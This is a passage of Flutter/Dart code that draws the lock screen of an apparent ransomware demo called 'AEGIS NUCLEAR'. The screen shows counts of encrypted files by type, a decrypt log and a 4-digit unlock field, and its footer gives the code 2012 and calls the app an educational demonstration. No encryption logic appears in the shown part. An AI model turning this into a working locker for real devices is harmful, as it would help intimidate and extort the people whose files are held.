  Widget build(BuildContext context) {
    return Scaffold(
      body: AnimatedBuilder(
        animation: _glitchController,
        builder: (context, child) {
          return Transform.translate(
            offset: Offset(
              _glitchController.value * 15 * (DateTime.now().millisecond % 2 == 0 ? 1 : -1),
              _glitchController.value * 8 * (DateTime.now().millisecond % 3 == 0 ? 1 : -1),
            ),
            child: Container(
              decoration: BoxDecoration(
                gradient: SweepGradient(
                  colors: [
                    Colors.black,
                    wrongCode ? Colors.red : Colors.red.shade900,
                    Colors.black,
                    wrongCode ? Colors.orange : Colors.red.shade800,
                    Colors.black,
                  ],
                ),
              ),
              child: SafeArea(
                child: SingleChildScrollView(
                  child: Padding(
                    padding: const EdgeInsets.all(20),
                    child: Column(
                      children: [
                        // Icon with glitch
                        Stack(
                          alignment: Alignment.center,
                          children: [
                            if (_glitchController.value > 0)
                              Positioned(
                                left: 2,
                                top: -2,
                                child: Icon(
                                  wrongCode ? Icons.error : Icons.lock,
                                  color: Colors.green.withOpacity(0.3),
                                  size: 100,
                                ),
                              ),
                            if (_glitchController.value > 0)
                              Positioned(
                                left: -2,
                                top: 2,
                                child: Icon(
                                  wrongCode ? Icons.error : Icons.lock,
                                  color: Colors.blue.withOpacity(0.3),
                                  size: 100,
                                ),
                              ),
                            Icon(
                              wrongCode ? Icons.error : Icons.lock,
                              color: wrongCode ? Colors.orange : Colors.red,
                              size: 100,
                            ),
                          ],
                        ),
                        
                        const SizedBox(height: 20),
                        
                        // Title
                        Text(
                          'AEGIS NUCLEAR',
                          style: TextStyle(
                            fontSize: 28,
                            fontWeight: FontWeight.bold,
                            color: wrongCode ? Colors.orange : Colors.red,
                            letterSpacing: 2,
                          ),
                        ),
                        
                        const SizedBox(height: 5),
                        
                        Text(
                          '🔒 LOCKED',
                          style: TextStyle(
                            fontSize: 16,
                            color: wrongCode ? Colors.orange.shade300 : Colors.red.shade300,
                          ),
                        ),
                        
                        const SizedBox(height: 20),
                        
                        // Statistics Card
                        Container(
                          width: double.infinity,
                          padding: const EdgeInsets.all(15),
                          decoration: BoxDecoration(
                            color: Colors.black54,
                            borderRadius: BorderRadius.circular(16),
                            border: Border.all(
                              color: wrongCode ? Colors.orange : Colors.red.shade900,
                              width: 2,
                            ),
                          ),
                          child: Column(
                            children: [
                              const Text(
                                '📊 ENCRYPTED FILES',
                                style: TextStyle(
                                  color: Colors.red,
                                  fontWeight: FontWeight.bold,
                                ),
                              ),
                              const SizedBox(height: 10),
                              Row(
                                mainAxisAlignment: MainAxisAlignment.spaceAround,
                                children: [
                                  _buildStat('📁', 'Archives', widget.zipCount.toString()),
                                  _buildStat('🖼️', 'Images', widget.imageCount.toString()),
                                  _buildStat('📄', 'Docs', widget.docCount.toString()),
                                ],
                              ),
                              const SizedBox(height: 5),
                              Row(
                                mainAxisAlignment: MainAxisAlignment.spaceAround,
                                children: [
                                  _buildStat('🎥', 'Videos', widget.videoCount.toString()),
                                  _buildStat('🎵', 'Audio', widget.audioCount.toString()),
                                  _buildStat('📦', 'Other', widget.otherCount.toString()),
                                ],
                              ),
                              const SizedBox(height: 10),
                              Container(
                                padding: const EdgeInsets.all(8),
                                decoration: BoxDecoration(
                                  color: Colors.red.withOpacity(0.2),
                                  borderRadius: BorderRadius.circular(8),
                                ),
                                child: Text(
                                  'TOTAL: ${widget.fileCount} FILES',
                                  style: const TextStyle(
                                    color: Colors.red,
                                    fontWeight: FontWeight.bold,
                                    fontSize: 16,
                                  ),
                                ),
                              ),
                            ],
                          ),
                        ),
                        
                        const SizedBox(height: 20),
                        
                        // Status Card
                        Container(
                          width: double.infinity,
                          padding: const EdgeInsets.all(15),
                          decoration: BoxDecoration(
                            color: Colors.black54,
                            borderRadius: BorderRadius.circular(12),
                            border: Border.all(
                              color: wrongCode ? Colors.orange : Colors.red.shade900,
                            ),
                          ),
                          child: Column(
                            children: [
                              Text(
                                status,
                                style: TextStyle(
                                  color: wrongCode ? Colors.orange : Colors.white,
                                  fontSize: 14,
                                  fontWeight: FontWeight.w500,
                                ),
                                textAlign: TextAlign.center,
                              ),
                              if (isDecrypting) ...[
                                const SizedBox(height: 10),
                                LinearProgressIndicator(
                                  value: progress,
                                  backgroundColor: Colors.grey.shade900,
                                  valueColor: const AlwaysStoppedAnimation<Color>(Colors.green),
                                  minHeight: 6,
                                  borderRadius: BorderRadius.circular(3),
                                ),
                                const SizedBox(height: 5),
                                Text(
                                  '${(progress * 100).toStringAsFixed(1)}%',
                                  style: const TextStyle(color: Colors.green, fontSize: 12),
                                ),
                              ],
                            ],
                          ),
                        ),
                        
                        const SizedBox(height: 20),
                        
                        // Decrypt Log
                        Container(
                          width: double.infinity,
                          padding: const EdgeInsets.all(10),
                          decoration: BoxDecoration(
                            color: Colors.black87,
                            borderRadius: BorderRadius.circular(8),
                            border: Border.all(color: Colors.red.shade900),
                          ),
                          child: Column(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              const Text(
                                '📋 DECRYPT LOG:',
                                style: TextStyle(
                                  color: Colors.red,
                                  fontSize: 12,
                                  fontWeight: FontWeight.bold,
                                ),
                              ),
                              const SizedBox(height: 5),
                              ..._decryptLog.map((log) => Text(
                                log,
                                style: const TextStyle(
                                  color: Colors.green,
                                  fontSize: 10,
                                  fontFamily: 'monospace',
                                ),
                              )),
                            ],
                          ),
                        ),
                        
                        const SizedBox(height: 20),
                        
                        // Code Input
                        if (!isDecrypting)
                          TextField(
                            controller: codeCtrl,
                            decoration: InputDecoration(
                              hintText: 'ENTER CODE 2012',
                              hintStyle: const TextStyle(color: Colors.grey),
                              filled: true,
                              fillColor: Colors.black54,
                              border: OutlineInputBorder(
                                borderRadius: BorderRadius.circular(12),
                                borderSide: BorderSide(
                                  color: wrongCode ? Colors.orange : Colors.red,
                                  width: 2,
                                ),
                              ),
                              prefixIcon: Icon(
                                Icons.key,
                                color: wrongCode ? Colors.orange : Colors.red,
                              ),
                              errorText: wrongCode ? 'Wrong code!' : null,
                              errorStyle: const TextStyle(color: Colors.orange),
                            ),
                            style: const TextStyle(
                              color: Colors.white,
                              fontSize: 20,
                              letterSpacing: 4,
                            ),
                            textAlign: TextAlign.center,
                            obscureText: true,
                            maxLength: 4,
                            keyboardType: TextInputType.number,
                          ),
                        
                        const SizedBox(height: 20),
                        
                        // Unlock Button
                        if (!isDecrypting)
                          ElevatedButton(
                            onPressed: startDecrypt,
                            style: ElevatedButton.styleFrom(
                              backgroundColor: wrongCode ? Colors.orange[900] : Colors.green[900],
                              minimumSize: const Size(double.infinity, 60),
                              shape: RoundedRectangleBorder(
                                borderRadius: BorderRadius.circular(12),
                                side: BorderSide(
                                  color: wrongCode ? Colors.orange : Colors.green.shade400,
                                  width: 2,
                                ),
                              ),
                              elevation: 10,
                            ),
                            child: Row(
                              mainAxisAlignment: MainAxisAlignment.center,
                              children: [
                                Icon(
                                  wrongCode ? Icons.warning : Icons.lock_open,
                                  size: 24,
                                ),
                                const SizedBox(width: 10),
                                Text(
                                  wrongCode ? 'TRY AGAIN' : '🔓 UNLOCK FILES',
                                  style: const TextStyle(
                                    fontSize: 18,
                                    fontWeight: FontWeight.bold,
                                  ),
                                ),
                              ],
                            ),
                          ),
                        
                        const SizedBox(height: 20),
                        
                        // Footer
                        Container(
                          padding: const EdgeInsets.all(12),
                          decoration: BoxDecoration(
                            color: Colors.black26,
                            borderRadius: BorderRadius.circular(8),
                          ),
                          child: const Text(
                            '⚠️ UNLOCK CODE: 2012 ⚠️\n'
                            'Educational demonstration only',
                            style: TextStyle(
                              color: Colors.grey,
                              fontSize: 11,
                            ),
                            textAlign: TextAlign.center,
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
              ),
            ),
          );
        },
      ),
    );
  }

  Widget _buildStat(String icon, String label, String value) {
    return Column(
      children: [
        Text(icon, style: const TextStyle(fontSize: 16)),
        Text(label, style: const TextStyle(color: Colors.white70, fontSize: 9)),
        Text(value, style: const TextStyle(color: Colors.red, fontSize: 14, fontWeight: FontWeight.bold)),
      ],
    );
  }
}
